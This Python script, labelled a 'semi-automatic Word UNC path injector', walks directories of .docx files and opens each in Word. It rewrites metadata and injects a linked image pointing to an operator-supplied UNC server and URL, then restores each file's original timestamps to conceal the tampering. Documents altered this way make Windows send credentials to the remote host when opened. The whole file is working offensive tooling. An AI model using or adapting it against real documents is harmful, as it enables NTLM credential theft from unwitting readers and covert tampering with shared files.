# v0.2 - manual inject with Windows/Word 200x

import os;
import sys;
import glob;
import time;
import getopt;
import shutil;
import winreg;
import zipfile;
import tempfile;
import subprocess as sp;

from xmls import *;

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Injector():
    def __init__(self, args:list):
        self.count = 0;
        self.successful = 0;

        self.recursive = False;

        self.url = '';
        self.server = '';
        self.directory = '';
        self.parse_args(args);
        self.tmpdir = tempfile.gettempdir();
        if not self.check_winword(): exit(os.EX_OK);
        return;

    def check_winword(self):

        self.winword = self.reg_val_get(winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\winword.exe', 'Path');
        if self.winword == '':
            log('[ERR] winword not found (not installed?)', bcolors.FAIL);
            return False;
        else:
            self.winword = os.path.join(self.winword, 'winword.exe');
            if not os.path.exists(self.winword):
                log('[ERR] winword not found (not installed?)', bcolors.FAIL);
                return False;
        return True;

    def reg_val_get(self, key:int, subkey:str, name:str):

        value = '';
        try:
            hWinword = winreg.OpenKey(key, subkey);
            num = winreg.QueryInfoKey(hWinword)[1];
            for n in range(num):
                data = winreg.EnumValue(hWinword, n);
                if data[0] == name:
                    value = data[1];
                    break;
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
        finally:
            winreg.CloseKey(hWinword);
        return value;

    def help(self):
        log('[INF] usage: injector.py -d <directory> -s <server> -u <url> [-r]', bcolors.HEADER);
        sys.exit(os.EX_OK);
        return;

    def parse_args(self, args:list):
        try:
            opts, args = getopt.getopt(args,'hrd:s:u:',['directory=','server=','url=']);
            for opt, arg in opts:
                if opt == '-h': self.help();
                elif opt in ('-r','--recursive'): self.recursive = True;
                elif opt in ('-u', '--url'): self.url = arg;
                elif opt in ('-d', '--directory'): self.directory = arg;
                elif opt in ('-s', '--server'): self.server = arg;
        except getopt.GetoptError:
            self.help();
        else:
            if self.server == '': self.help();
            elif self.url == '': self.help();
            elif self.directory == '': self.directory = os.getcwd();
            elif not os.path.isabs(self.directory): self.directory = os.path.join(os.getcwd(), self.directory);
        
            if self.server.startswith('\\'):
                if not self.server.startswith('\\\\'): self.server = '\\' + self.server;
            else: self.server = '\\\\' + self.server;
        return;

    def file_writeable(self, filename:str):
        if os.access(filename, os.W_OK) and os.stat(filename).st_size > 0:
            self.count += 1; log('[INF] processing: ' + filename, bcolors.OKGREEN); return True;
        else: log('[WRN] file ' + filename + 'is not accessable', bcolors.WARNING); return False;

    def file_times_get(self, filename:str):
       return (os.path.getatime(filename), os.path.getmtime(filename));

    def file_times_set(self, filename:str, filetimes:tuple):
        os.utime(filename, filetimes);
        return;

    def file_temp_get(self): # retn file, not str
        return tempfile.TemporaryDirectory();

    def files_unzip(self, src:str, dest: str):
        ret = False;
        try:
            with open(src, 'rb') as file:
                with zipfile.ZipFile(file, 'r') as archive:
                    archive.extractall(dest);
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
        else: ret = True;
        finally: file.close();
        return ret;

    def files_zip(self,  path:str, filename:str): # assamble back
        ret = False;
        try:
            with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, subfolders, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, arcname=os.path.relpath(file_path, path))
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
        else: ret = True;
        finally: zipf.close();
        return ret;

    def file_copy(self, src:str, dest:str):
        shutil.copy(src, dest);
        return;

    def files_del(self, src:str):

        for filename in os.listdir(src):
            file = os.path.join(src, filename)
            try:
                if os.path.isfile(file) or os.path.islink(file):
                    os.unlink(file)
                elif os.path.isdir(file):
                    shutil.rmtree(file)
            except Exception as ex:
                log('[ERR] failed to delete %s. Reason: %s' % (file, str(ex)), bcolors.FAIL);
        return;

    def files_clean(self, root:tempfile.TemporaryDirectory, filename:str = ''):
        try:
            # root.cleanup();
            # shutil.rmtree(root.name);
            self.files_del(root.name);
            if not filename == '': os.unlink(filename);
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
        return;

    def launch_proc(self, target:str):
        try:
            process = sp.Popen([self.winword, target]);
            process.wait();
        except Exception as ex:
            log(str(ex), bcolors.FAIL);
            return False;
        return True;

    def inject_files(self, target:str):
        for filename in glob.iglob(self.directory + '\**\*.docx', recursive=self.recursive):
            self.inject_file(filename);
        return;

    def inject_file(self, target_doc:str):

        if not self.file_writeable(target_doc): return;

        # before modification
        temp_dir = self.file_temp_get();
        temp_doc = os.path.join(self.tmpdir, os.path.basename(target_doc));
        self.file_copy(target_doc, temp_doc);
        file_times = self.file_times_get(target_doc);

        if not self.files_unzip(temp_doc, temp_dir.name):
            self.files_clean(temp_dir, temp_doc);
            return;
        doc = Xmls(temp_dir.name);
        if not doc.xml_metadata_get():
            self.files_clean(temp_dir, temp_doc);
            return;
        else: self.files_clean(temp_dir);
    
        # modification. warn before
        if not self.launch_proc(temp_doc):
            self.files_clean(temp_dir, temp_doc);
            return;
    
        # after modification
        if not self.files_unzip(temp_doc, temp_dir.name):
            self.files_clean(temp_dir, temp_doc);
            return;
        if not doc.xml_metadata_set() or not doc.xml_inject_img(self.server, self.url):
            self.files_clean(temp_dir, temp_doc);
            return;

        # assemble
        self.files_zip(temp_dir.name, temp_doc);
        self.file_copy(temp_doc, target_doc); # check the creation time, if changed, rewrite file instead of copy
        self.files_clean(temp_dir, temp_doc);
        shutil.rmtree(temp_dir.name);

        self.file_times_set(target_doc, file_times);
        self.successful += 1;
        return;

    def scan(self):
        if os.path.exists(self.directory):
            if os.path.isfile(self.directory):
                if self.recursive == True: log('[WRN] ignoring recursive option, because target is a single file', bcolors.WARNING);
                self.inject_file(self.directory);
            elif os.path.isdir(self.directory):
                self.inject_files(self.directory);
            else: log('[ERR] ' + self.directory + ' doesn\'t file ror directory', bcolors.FAIL)
        else: log('[ERR] ' + self.directory + ' doesn\'t not exists', bcolors.FAIL);
        return;

def log(message:str, level:str):
    print(level + message + bcolors.ENDC);
    return;

if __name__ == '__main__':

    log('[INF] This is simple semi-automatic Word UNC path injector. Required any (tested on a 2010 and 2016 version) Winword application installed in your system.', bcolors.HEADER);
    log('[INF] Temporary document(s) will be opened in Word application. You must to change it (them) manually. To link an image, open the insert tab and click the Pictures icon. This will bring up the explorer window. In the file name field, enter the URL and hit the insert drop down to choose “Link to File”. I recommend insert the image in a place that is less likely to be changed or deleted. Once linked, the image can be sized down to nothing. Make sure to save the changes to the document.\n', bcolors.WARNING);
    time.sleep(3);
    
    injector = Injector(sys.argv[1:]);
    injector.scan();
    print('[INF] Documents found: %s, successfully handled: %s' % (injector.count, injector.successful));
